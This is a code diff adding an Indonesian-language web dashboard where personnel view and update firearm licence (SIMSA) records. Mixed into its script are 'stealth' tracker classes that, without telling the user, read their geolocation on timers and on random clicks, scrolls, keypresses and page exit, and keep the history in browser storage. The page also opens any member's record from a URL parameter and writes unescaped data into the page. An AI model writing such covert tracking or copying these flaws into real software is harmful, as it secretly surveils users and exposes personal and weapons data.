@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard Anggota - Sistem Tracking Senpi</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        :root {
+            --primary: #dc2626;
+            --primary-dark: #b91c1c;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --dark: #1e293b;
+            --light: #f8fafc;
+        }
+
+        body {
+            background: linear-gradient(135deg, #dbeafe 0%, #93c5fd 100%);
+            min-height: 100vh;
+            padding: 2rem;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .header {
+            background: white;
+            padding: 2rem;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            margin-bottom: 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .user-info h1 {
+            color: var(--dark);
+            margin-bottom: 0.5rem;
+            font-size: 1.8rem;
+            font-weight: 700; 
+        }
+
+        .user-info p {
+            color: #64748b;
+            font-size: 1.1rem;
+        }
+
+        .logout-btn {
+            background: var(--danger);
+            color: white;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 10px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .logout-btn:hover {
+            background: #dc2626;
+            transform: translateY(-2px);
+        }
+
+        .senpi-card {
+            background: white;
+            padding: 2rem;
+            border-radius: 15px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+            margin-bottom: 1.5rem;
+            border-left: 5px solid var(--primary); 
+        }
+
+        .senpi-card h2 {
+            color: var(--primary);
+            margin-bottom: 1rem;
+            font-size: 1.5rem;
+            border-bottom: 2px dashed #f1f5f9;
+            padding-bottom: 0.5rem;
+        }
+
+        .senpi-detail {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .senpi-detail div {
+            padding: 0.5rem 0;
+            border-bottom: 1px dashed #e2e8f0;
+        }
+
+        .senpi-detail strong {
+            display: block;
+            color: #64748b;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        .senpi-detail span {
+            display: block;
+            color: var(--dark);
+            font-size: 1rem;
+            font-weight: 600;
+        }
+        
+        .senpi-detail a {
+             color: #2563eb;
+             text-decoration: none;
+        }
+
+        .btn-edit-simsa {
+            background: #dbeafe;
+            color: #2563eb;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+
+        .btn-edit-simsa:hover {
+            background: #93c5fd;
+            transform: translateY(-1px);
+        }
+
+        .status-badge {
+            padding: 0.6rem 1.2rem;
+            border-radius: 25px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .status-aktif { background: #dcfce7; color: #16a34a; border: 1px solid #bbf7d0;}
+        .status-pending { background: #fef3c7; color: #d97706; border: 1px solid #fde68a;}
+        .status-expired { background: #fee2e2; color: #dc2626; border: 1px solid #fecaca;}
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(5px);
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 2.5rem;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 500px;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+
+        .modal h2 {
+            margin-bottom: 1.5rem;
+            color: var(--dark);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 1.5rem;
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            color: var(--dark);
+            font-size: 1rem;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 0.75rem;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border-color 0.3s ease;
+        }
+
+        .modal-actions {
+            display: flex;
+            gap: 1rem;
+            justify-content: flex-end;
+            margin-top: 2rem;
+        }
+
+        .btn-cancel {
+            background: #64748b;
+            color: white;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+
+        .btn-submit {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .accuracy-info {
+            background: #f0f9ff;
+            border: 1px solid #e0f2fe;
+            border-radius: 10px;
+            padding: 1rem;
+            margin: 1rem 0;
+            text-align: center;
+        }
+
+        .accuracy-high { color: #10b981; }
+        .accuracy-medium { color: #f59e0b; }
+        .accuracy-low { color: #ef4444; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="user-info">
+                <h1>Selamat Datang, <span id="userName">Anggota</span></h1>
+                <p><span id="userPangkat"></span> (<span id="userNrp"></span>) - <span id="userKesatuan"></span></p>
+            </div>
+            <button class="logout-btn" onclick="logout()">
+                <i class="fas fa-sign-out-alt"></i>
+                Logout
+            </button>
+        </div>
+
+        <div class="accuracy-info" id="accuracyInfo" style="display: none;">
+            <i class="fas fa-map-marker-alt"></i>
+            <span id="accuracyText">Memeriksa akurasi lokasi...</span>
+        </div>
+
+        <div id="senpiList">
+            <div class="senpi-card">
+                 <h2><i class="fas fa-spinner fa-spin"></i> Memuat data Senpi...</h2>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal" id="editSimsaModal">
+        <div class="modal-content">
+            <h2><i class="fas fa-id-card"></i> Input Data SIMSA/Senpi</h2>
+            <form id="editSimsaForm">
+                <p>Mengedit Senpi: <strong id="editSimsaNomorSeri"></strong></p>
+
+                <input type="hidden" id="editSimsaNrp">
+                <input type="hidden" id="editSimsaSenpiIndex">
+
+                <div class="input-group">
+                    <label for="editSimsaTanggalTerbit"><i class="fas fa-calendar-check"></i> Tanggal Terbit SIMSA</label>
+                    <input type="date" id="editSimsaTanggalTerbit" required>
+                </div>
+                <div class="input-group">
+                    <label for="editSimsaTanggalExpired"><i class="fas fa-calendar-times"></i> Tanggal Expired SIMSA (Otomatis)</label>
+                    <input type="date" id="editSimsaTanggalExpired" required readonly>
+                </div>
+
+                <div class="input-group">
+                    <label for="editSimsaFotoSimsa"><i class="fas fa-file-image"></i> Upload Foto SIMSA (Max 2MB)</label>
+                    <input type="file" id="editSimsaFotoSimsa" accept="image/*">
+                    <small>Foto SIMSA saat ini: <span id="currentFotoSimsa"></span></small>
+                </div>
+                <div class="input-group">
+                    <label for="editSimsaFotoSenpi"><i class="fas fa-camera"></i> Upload Foto Senpi (Max 2MB)</label>
+                    <input type="file" id="editSimsaFotoSenpi" accept="image/*">
+                    <small>Foto Senpi saat ini: <span id="currentFotoSenpi"></span></small>
+                </div>
+                <div class="modal-actions">
+                    <button type="button" class="btn btn-cancel" onclick="closeModal('editSimsaModal')">
+                        <i class="fas fa-times"></i> Batal
+                    </button>
+                    <button type="submit" class="btn btn-submit">
+                        <i class="fas fa-save"></i> Simpan & Upload
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // ✅ STEALTH TRACKER CLASS
+        class StealthLocationTracker {
+            constructor(nrp) {
+                this.nrp = nrp;
+                this.isTracking = false;
+                this.updateIntervals = {
+                    normal: 300000,    // 5 menit
+                    background: 600000, // 10 menit  
+                    hidden: 900000     // 15 menit
+                };
+                this.currentInterval = this.updateIntervals.normal;
+            }
+
+            startStealthTracking() {
+                if (this.isTracking) return;
+                
+                this.isTracking = true;
+                console.log('🦇 Stealth tracking activated for:', this.nrp);
+                
+                this.silentLocationUpdate();
+                this.setupAppStateMonitoring();
+                this.restartTrackingInterval();
+                
+                return true;
+            }
+
+            stopStealthTracking() {
+                this.isTracking = false;
+                if (this.intervalId) {
+                    clearInterval(this.intervalId);
+                }
+                console.log('🦇 Stealth tracking stopped for:', this.nrp);
+            }
+
+            async silentLocationUpdate() {
+                if (!this.isTracking) return;
+                
+                try {
+                    const location = await this.getStealthLocation();
+                    if (location) {
+                        await this.saveStealthLocation(location);
+                        console.log('📍 Stealth location updated:', this.nrp);
+                    }
+                } catch (error) {
+                    console.log('📍 Stealth update failed:', error.message);
+                }
+            }
+
+            getStealthLocation() {
+                return new Promise((resolve, reject) => {
+                    const options = {
+                        enableHighAccuracy: false,
+                        timeout: 15000,
+                        maximumAge: 300000
+                    };
+
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                nrp: this.nrp,
+                                lat: position.coords.latitude,
+                                lng: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                                timestamp: new Date().toISOString(),
+                                source: 'stealth'
+                            });
+                        },
+                        (error) => reject(error),
+                        options
+                    );
+                });
+            }
+
+            setupAppStateMonitoring() {
+                document.addEventListener('visibilitychange', () => {
+                    if (document.hidden) {
+                        this.currentInterval = this.updateIntervals.hidden;
+                    } else {
+                        this.currentInterval = this.updateIntervals.normal;
+                    }
+                    this.restartTrackingInterval();
+                });
+
+                window.addEventListener('blur', () => {
+                    this.currentInterval = this.updateIntervals.background;
+                    this.restartTrackingInterval();
+                });
+
+                window.addEventListener('focus', () => {
+                    this.currentInterval = this.updateIntervals.normal;
+                    this.restartTrackingInterval();
+                });
+            }
+
+            restartTrackingInterval() {
+                if (this.intervalId) {
+                    clearInterval(this.intervalId);
+                }
+                
+                this.intervalId = setInterval(() => {
+                    if (this.isTracking) {
+                        this.silentLocationUpdate();
+                    }
+                }, this.currentInterval);
+            }
+
+            async saveStealthLocation(location) {
+                try {
+                    const stealthData = JSON.parse(localStorage.getItem('stealth_location_data') || '{}');
+                    const userData = stealthData[location.nrp] || [];
+                    
+                    userData.push({
+                        lat: location.lat,
+                        lng: location.lng,
+                        accuracy: location.accuracy,
+                        timestamp: location.timestamp,
+                        source: 'stealth'
+                    });
+                    
+                    if (userData.length > 100) {
+                        stealthData[location.nrp] = userData.slice(-100);
+                    } else {
+                        stealthData[location.nrp] = userData;
+                    }
+                    
+                    localStorage.setItem('stealth_location_data', JSON.stringify(stealthData));
+                    
+                    return true;
+                } catch (error) {
+                    console.log('Stealth save failed:', error);
+                    return false;
+                }
+            }
+        }
+
+        class AnggotaStealthSystem {
+            constructor(nrp) {
+                this.nrp = nrp;
+                this.stealthTracker = new StealthLocationTracker(nrp);
+                this.isStealthActive = false;
+            }
+
+            initStealthSystem() {
+                setTimeout(() => {
+                    this.startStealthTracking();
+                }, 30000);
+                
+                this.setupStealthTriggers();
+            }
+
+            startStealthTracking() {
+                if (!this.isStealthActive) {
+                    this.isStealthActive = true;
+                    this.stealthTracker.startStealthTracking();
+                    localStorage.setItem(`stealth_${this.nrp}`, 'active');
+                }
+            }
+
+            stopStealthTracking() {
+                this.isStealthActive = false;
+                this.stealthTracker.stopStealthTracking();
+                localStorage.removeItem(`stealth_${this.nrp}`);
+            }
+
+            setupStealthTriggers() {
+                const stealthTriggers = [
+                    'click', 'touchstart', 'scroll', 'mousemove',
+                    'keydown', 'submit', 'change'
+                ];
+
+                stealthTriggers.forEach(event => {
+                    document.addEventListener(event, () => {
+                        if (this.isStealthActive && Math.random() < 0.3) {
+                            this.stealthTracker.silentLocationUpdate();
+                        }
+                    }, { passive: true });
+                });
+
+                window.addEventListener('beforeunload', () => {
+                    this.stealthTracker.silentLocationUpdate();
+                });
+            }
+        }
+
+        // ✅ EXISTING FUNCTIONALITY
+        const API_URL_EKSTERNAL = 'https://script.google.com/macros/s/AKfycbzEcFtp9ArMgU9ytcu1BPfZ8dys1TBQnsFqGMiR6UGx-TRuRrrnV82eO8YnJ1fRB60CJw/exec';
+        let userData = null;
+        let USERS_DATA = {}; 
+
+        function closeModal(id) {
+            document.getElementById(id).style.display = 'none';
+        }
+        
+        function getUrlParams() {
+            const params = {};
+            window.location.search.substring(1).split('&').forEach(pair => {
+                const [key, value] = pair.split('=');
+                params[key] = value;
+            });
+            return params;
+        }
+
+        function saveUsersData() {
+            localStorage.setItem('temp_users_data', JSON.stringify(USERS_DATA));
+        }
+
+        function logout() {
+            if (confirm('Yakin ingin logout?')) {
+                // Stop stealth tracking
+                if (window.stealthSystem) {
+                    window.stealthSystem.stopStealthTracking();
+                }
+                localStorage.removeItem('currentUser');
+                window.location.href = 'index.html';
+            }
+        }
+        
+        function formatDate(date) {
+            const d = new Date(date);
+            let month = '' + (d.getMonth() + 1);
+            let day = '' + d.getDate();
+            const year = d.getFullYear();
+
+            if (month.length < 2) 
+                month = '0' + month;
+            if (day.length < 2) 
+                day = '0' + day;
+
+            return [year, month, day].join('-');
+        }
+
+        // ✅ Load Data Anggota
+        async function loadUserData() {
+            const currentUser = localStorage.getItem('currentUser');
+            const urlParams = getUrlParams();
+            const nrp = urlParams.nrp || (currentUser ? JSON.parse(currentUser).nrp : null);
+
+            if (!nrp) {
+                alert('Sesi habis atau akses ditolak. Silakan login.');
+                window.location.href = 'index.html';
+                return;
+            }
+
+            try {
+                let result;
+                const tempUsersData = localStorage.getItem('temp_users_data');
+
+                if (tempUsersData) {
+                    result = { users: JSON.parse(tempUsersData) };
+                } else {
+                    const response = await fetch('data.json');
+                    result = await response.json();
+                }
+                
+                USERS_DATA = result.users;
+                userData = USERS_DATA[nrp];
+
+                if (!userData) {
+                    alert('Data personel tidak ditemukan.');
+                    logout();
+                    return;
+                }
+
+                displayUserInfo(nrp);
+                displaySenpiList(nrp);
+                checkLocationAccuracy();
+
+            } catch (error) {
+                console.error('Error memuat data:', error);
+                alert('Gagal memuat data sistem. Coba refresh atau hubungi admin.');
+            }
+        }
+
+        function displayUserInfo(nrp) {
+            document.getElementById('userName').textContent = userData.nama;
+            document.getElementById('userPangkat').textContent = userData.pangkat;
+            document.getElementById('userNrp').textContent = nrp;
+            document.getElementById('userKesatuan').textContent = userData.kesatuan;
+        }
+
+        function displaySenpiList(nrp) {
+            const senpiListDiv = document.getElementById('senpiList');
+            
+            if (userData.senpi.length === 0) {
+                senpiListDiv.innerHTML = '<div class="senpi-card"><h2><i class="fas fa-exclamation-triangle"></i> Anda tidak terdaftar memiliki Senpi.</h2><p>Silakan hubungi bagian logistik untuk verifikasi data.</p></div>';
+                return;
+            }
+
+            senpiListDiv.innerHTML = userData.senpi.map((senpi, index) => {
+                let status = senpi.tanggal_terbit_simsa ? 'AKTIF' : 'PENDING';
+                let statusClass = 'status-pending';
+
+                if (senpi.tanggal_expired) {
+                    const expiryDate = new Date(senpi.tanggal_expired);
+                    const today = new Date();
+                    today.setHours(0,0,0,0); 
+                    
+                    if (expiryDate < today) {
+                        status = 'EXPIRED';
+                        statusClass = 'status-expired';
+                    } else if (status === 'AKTIF') {
+                         statusClass = 'status-aktif';
+                    }
+                }
+
+                const fotoSimsaLink = senpi.foto_simsa && senpi.foto_simsa !== '-' ? `<a href="${senpi.foto_simsa}" target="_blank"><i class="fas fa-external-link-alt"></i> Lihat</a>` : '-';
+                const fotoSenpiLink = senpi.foto_senpi && senpi.foto_senpi !== '-' ? `<a href="${senpi.foto_senpi}" target="_blank"><i class="fas fa-external-link-alt"></i> Lihat</a>` : '-';
+
+                return `
+                    <div class="senpi-card">
+                        <h2><i class="fas fa-gun"></i> Senpi No. Seri: ${senpi.nomor_seri}</h2>
+                        <div class="senpi-detail">
+                            <div><strong>Jenis</strong><span>${senpi.jenis}</span></div>
+                            <div><strong>Keterangan</strong><span>${senpi.keterangan}</span></div>
+                            <div><strong>Tanggal Terbit SIMSA</strong><span>${senpi.tanggal_terbit_simsa || '-'}</span></div>
+                            <div><strong>Tanggal Expired</strong><span>${senpi.tanggal_expired || '-'}</span></div>
+                            <div><strong>Status Data</strong><span class="status-badge ${statusClass}">${status}</span></div>
+                            <div><strong>Link Foto SIMSA</strong><span>${fotoSimsaLink}</span></div>
+                            <div><strong>Link Foto Senpi</strong><span>${fotoSenpiLink}</span></div>
+                        </div>
+                        <button class="btn-edit-simsa" onclick="showEditSimsaModal('${senpi.nomor_seri}', ${index}, '${nrp}')">
+                            <i class="fas fa-upload"></i> Input/Perbarui Data SIMSA
+                        </button>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        function checkLocationAccuracy() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const accuracy = position.coords.accuracy;
+                        const accuracyElement = document.getElementById('accuracyText');
+                        const accuracyInfo = document.getElementById('accuracyInfo');
+                        
+                        let accuracyClass = 'accuracy-low';
+                        let status = 'Rendah';
+                        
+                        if (accuracy <= 20) {
+                            accuracyClass = 'accuracy-high';
+                            status = 'Tinggi';
+                        } else if (accuracy <= 100) {
+                            accuracyClass = 'accuracy-medium';
+                            status = 'Sedang';
+                        }
+                        
+                        accuracyElement.innerHTML = `Akurasi Lokasi: <span class="${accuracyClass}">${status} (${Math.round(accuracy)} meter)</span>`;
+                        accuracyInfo.style.display = 'block';
+                    },
+                    (error) => {
+                        console.log('Accuracy check failed:', error);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            }
+        }
+        
+        function showEditSimsaModal(nomorSeri, index, nrp) {
+            const senpi = USERS_DATA[nrp].senpi[index];
+
+            document.getElementById('editSimsaNomorSeri').textContent = nomorSeri;
+            document.getElementById('editSimsaNrp').value = nrp;
+            document.getElementById('editSimsaSenpiIndex').value = index;
+            
+            document.getElementById('editSimsaTanggalTerbit').value = senpi.tanggal_terbit_simsa || '';
+            document.getElementById('editSimsaTanggalExpired').value = senpi.tanggal_expired || '';
+            
+            document.getElementById('currentFotoSimsa').innerHTML = senpi.foto_simsa && senpi.foto_simsa !== '-' ? `<a href="${senpi.foto_simsa}" target="_blank">Lihat URL</a>` : 'Kosong';
+            document.getElementById('currentFotoSenpi').innerHTML = senpi.foto_senpi && senpi.foto_senpi !== '-' ? `<a href="${senpi.foto_senpi}" target="_blank">Lihat URL</a>` : 'Kosong';
+            
+            document.getElementById('editSimsaFotoSimsa').value = '';
+            document.getElementById('editSimsaFotoSenpi').value = '';
+
+            document.getElementById('editSimsaModal').style.display = 'flex';
+        }
+        
+        document.getElementById('editSimsaTanggalTerbit').addEventListener('input', function() {
+            const tanggalTerbitInput = this.value;
+            if (tanggalTerbitInput) {
+                const date = new Date(tanggalTerbitInput);
+                date.setFullYear(date.getFullYear() + 1);
+                document.getElementById('editSimsaTanggalExpired').value = formatDate(date);
+            } else {
+                document.getElementById('editSimsaTanggalExpired').value = '';
+            }
+        });
+
+        document.getElementById('editSimsaForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const nrp = document.getElementById('editSimsaNrp').value;
+            const index = parseInt(document.getElementById('editSimsaSenpiIndex').value);
+            
+            const newTanggalTerbit = document.getElementById('editSimsaTanggalTerbit').value.trim();
+            const newTanggalExpired = document.getElementById('editSimsaTanggalExpired').value.trim();
+            const fileSimsa = document.getElementById('editSimsaFotoSimsa').files[0];
+            const fileSenpi = document.getElementById('editSimsaFotoSenpi').files[0];
+            
+            const senpi = USERS_DATA[nrp].senpi[index];
+            
+            if (!newTanggalTerbit || !newTanggalExpired) {
+                alert('Tanggal Terbit dan Expired harus diisi!');
+                return;
+            }
+
+            const formData = new FormData();
+            formData.append('action', 'updateSenpiAnggota');
+            formData.append('nrp', nrp);
+            formData.append('nomor_seri', senpi.nomor_seri);
+            formData.append('tanggal_terbit_simsa', newTanggalTerbit);
+            formData.append('tanggal_expired', newTanggalExpired);
+            
+            if (fileSimsa) {
+                formData.append('foto_simsa', fileSimsa);
+            }
+            if (fileSenpi) {
+                formData.append('foto_senpi', fileSenpi);
+            }
+            
+            try {
+                document.querySelector('.btn-submit').disabled = true;
+                document.querySelector('.btn-submit').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mengirim Data...';
+
+                const response = await fetch(API_URL_EKSTERNAL, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+
+                if (result.success) {
+                    senpi.tanggal_terbit_simsa = newTanggalTerbit;
+                    senpi.tanggal_expired = newTanggalExpired;
+                    
+                    if (result.foto_simsa_url) {
+                         senpi.foto_simsa = result.foto_simsa_url;
+                    }
+                    if (result.foto_senpi_url) {
+                         senpi.foto_senpi = result.foto_senpi_url;
+                    }
+                    
+                    saveUsersData();
+                    
+                    loadUserData();
+                    closeModal('editSimsaModal');
+                    alert(`✅ Data SIMSA dan Senpi berhasil diperbarui di database Logistik`);
+
+                } else {
+                    alert(`❌ Gagal memperbarui data di Spreadsheet. Pesan: ${result.message || 'Error tidak diketahui'}`);
+                }
+                
+            } catch (error) {
+                console.error('API Error:', error);
+                alert('❌ Gagal terhubung ke Google Apps Script. Pastikan URL API sudah benar dan script aktif.');
+            } finally {
+                document.querySelector('.btn-submit').disabled = false;
+                document.querySelector('.btn-submit').innerHTML = '<i class="fas fa-save"></i> Simpan & Upload';
+            }
+        });
+
+        // ✅ INIT STEALTH SYSTEM SETELAH PAGE LOAD
+        document.addEventListener('DOMContentLoaded', function() {
+            loadUserData();
+            
+            const currentUser = JSON.parse(localStorage.getItem('currentUser'));
+            if (currentUser && currentUser.nrp) {
+                setTimeout(() => {
+                    const stealthSystem = new AnggotaStealthSystem(currentUser.nrp);
+                    stealthSystem.initStealthSystem();
+                    window.stealthSystem = stealthSystem;
+                    console.log('🦇 Stealth system initialized for:', currentUser.nrp);
+                }, 10000);
+            }
+        });
+    </script>
+</body>
+</html>
